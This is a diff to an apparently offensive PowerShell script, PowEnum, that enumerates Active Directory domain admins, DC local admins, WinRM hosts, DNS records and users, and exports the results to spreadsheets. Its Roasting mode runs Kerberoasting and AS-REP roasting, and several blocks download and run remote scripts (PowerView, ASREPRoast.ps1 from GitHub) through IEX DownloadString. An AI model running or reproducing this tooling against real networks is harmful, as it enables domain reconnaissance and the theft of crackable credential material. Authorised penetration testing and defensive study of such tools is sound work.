@@ -72,7 +72,7 @@ Param(
 	$Domain,
 	
 	[Parameter(Position = 1)]
-	[ValidateSet('DCOnly', 'Hunting', 'Roasting', 'LargeEnv', 'Special')]
+	[ValidateSet('DCOnly', 'Roasting', 'LargeEnv', 'Special')]
     [String]
     $Mode = 'DCOnly',
 
@@ -95,12 +95,18 @@ $stopwatch = [system.diagnostics.stopwatch]::startnew()
 
 #Download PowerView from specified URL or from GitHub.
 try {
-	$webclient = New-Object System.Net.WebClient
-	$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-	Write-Host "Downloading Powerview:" -ForegroundColor Cyan
-	Write-Host "$url | " -NoNewLine
-	IEX $webclient.DownloadString($url)
-	Write-Host "Success" -ForegroundColor Green
+    if (Test-Path .\PowerView.ps1){
+	    Write-Host "Skipping Download: Powervew.ps1 Present"
+        Import-Module .\PowerView.ps1    
+	}
+	else {	
+        $webclient = New-Object System.Net.WebClient
+        $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+        Write-Host "Downloading Powerview:" -ForegroundColor Cyan
+        Write-Host "$url | " -NoNewLine
+        IEX $webclient.DownloadString($url)
+        Write-Host "Success" -ForegroundColor Green
+    }
 }catch {Write-Host "Error" -ForegroundColor Red; Return}
 	
 #Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
@@ -140,7 +146,7 @@ if ($Mode -eq 'DCOnly') {
 	PowEnum-DAs
 	PowEnum-EAs
 	PowEnum-BltAdmins
-	PowEnum-HVTs
+    PowEnum-DCLocalAdmins
 	PowEnum-Users
 	PowEnum-Groups
 	PowEnum-ExcelFile -SpreadsheetName DCOnly-UsersAndGroups
@@ -153,15 +159,17 @@ if ($Mode -eq 'DCOnly') {
 	PowEnum-Computers
 	PowEnum-Subnets
 	PowEnum-DNSRecords
+    PowEnum-WinRM
 	PowEnum-ExcelFile -SpreadsheetName DCOnly-ComputersAndSessions
-}
-elseif ($Mode -eq 'Hunting') {
-	PowEnum-AdminEnum
-	PowEnum-UserHunting
-	PowEnum-ExcelFile -SpreadsheetName UserHunting
 }
 elseif ($Mode -eq 'Roasting') {
 	PowEnum-Kerberoast
+    $webclient = New-Object System.Net.WebClient
+    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+    $url = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
+    Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
+    Write-Host "$url"
+    IEX $webclient.DownloadString($url)
 	PowEnum-ASREPRoast
 	PowEnum-ExcelFile -SpreadsheetName Roasting
 }
@@ -287,12 +295,23 @@ function PowEnum-DNSRecords {
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
+#This function is broken right now so is it not being utilized
 function PowEnum-HVTs {
 	try {
 		Write-Host "[ ]High Value Targets | " -NoNewLine
-		$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember | Select-Object -ExpandProperty MemberName | %{$_ -replace '^[^\\]*\\', ''} | Get-DomainGroupMember -Recurse | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
-		PowEnum-ExportAndCount -TypeEnum HVTs
-	}catch {Write-Host "Error" -ForegroundColor Red}
+		
+        #Grab all admins of the DCs
+        $LocalAdminsOnDCs = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
+        
+        #Grab all "Domain" accounts and get the members
+        $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-DomainGroupMember
+        
+        #Grab all non-Domain accounts and get the members
+        $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $FALSE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-NetLocalGroupMember
+        
+        PowEnum-ExportAndCount -TypeEnum HVTs
+	
+    }catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-NetSess {
@@ -303,19 +322,11 @@ function PowEnum-NetSess {
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
-function PowEnum-UserHunting{
-	try{
-		Write-Host "[ ]User Hunting | " -NoNewLine
-		$temp = Find-DomainUserLocation -ShowAll -Domain $domain
-		PowEnum-ExportAndCount -TypeEnum UserHunt
-	}catch {Write-Host "Error" -ForegroundColor Red}
-}
-
-function PowEnum-AdminEnum{
-	try{
-		Write-Host "[ ]Admin Access Enumeration | " -NoNewLine
-		$temp = Find-DomainLocalGroupMember
-		PowEnum-ExportAndCount -TypeEnum UserHunt
+function PowEnum-WinRM {
+	try {
+		Write-Host "[ ]WinRm (Powershell Remoting) Enabled Hosts | " -NoNewLine
+		$temp = Get-DomainComputer -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
+		PowEnum-ExportAndCount -TypeEnum WinRM
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
@@ -385,12 +396,6 @@ function PowEnum-SmartCardReqPwNotExpNotReq {
 
 function PowEnum-ASREPRoast {
 	try{
-		$webclient = New-Object System.Net.WebClient
-		$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-		$url = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
-		Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
-		Write-Host "$url"
-		IEX $webclient.DownloadString($url)
 		Write-Host "[ ]ASREProast | " -NoNewLine
 		$temp = Invoke-ASREPRoast -Domain $domain
 		PowEnum-ExportAndCount -TypeEnum ASREPRoast
@@ -414,7 +419,7 @@ function PowEnum-ExportAndCount {
 	if($temp -ne $null){
 		
 		#Grab the file name and the full path
-		$exportfilename = $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
+		$exportfilename = $domain.Substring(0,$domain.IndexOf("."))+ '_' + $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
 		$exportfilepath = (Get-Item -Path ".\" -Verbose).FullName + '\' + $exportfilename
 		
 		#Perform the actual export
@@ -442,9 +447,9 @@ function PowEnum-ExcelFile {
 		Write-Host "[ ]Combining csv file(s) to xlsx | " -NoNewLine
 		
 		#Exit if enumeration resulting in nothing
-		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "Exiting: No Data Identified" -ForegroundColor Red; Return}
+		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "No Data Identified" -ForegroundColor Yellow; Return}
 		$path = (Get-Item -Path ".\" -Verbose).FullName
-		$XLOutput =  $path + "\" + $Domain + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"
+		$XLOutput =  $path + "\" + $Domain + "_" + $SpreadsheetName.Substring($SpreadsheetName.IndexOf("_")+1) + "_" + $(get-random) + ".xlsx"
 
 		# Create Excel object (visible), workbook and worksheet
 		$Excel = New-Object -ComObject excel.application 
